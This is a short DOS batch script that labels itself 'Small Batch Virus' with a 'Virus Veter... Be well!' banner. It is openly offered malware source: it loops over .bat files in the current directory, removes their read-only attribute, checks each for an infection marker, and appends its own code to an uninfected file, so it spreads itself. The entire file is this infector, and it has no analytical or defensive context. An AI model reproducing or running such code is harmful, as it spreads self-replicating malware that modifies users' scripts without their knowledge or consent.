@echo off%_Veter%
set q=nul
goto MasterBlock
:Message
echo ษอออออออออออออออออออออออออออป
echo บ Virus Veter... Be well!   บ
echo บ This is Small Batch Virus บ
echo ศอออออออออออออออออออออออออออผ
goto :!!
:MasterBlock
if "%1"=="/?" goto message
if "%0"=="" goto !!
:!! [Silly virus for batch files]
@for %%q in (*.bat) do set _!=%%q > %q%
@for %%b in (*.bat) do call attrib %%b -r > %q%
@for %%a in (*.bat) do find "_!" %%a > %q%
@if not errorLevel 1 goto ! > %q%
@type %0 >> %_!%
@goto !!
:!
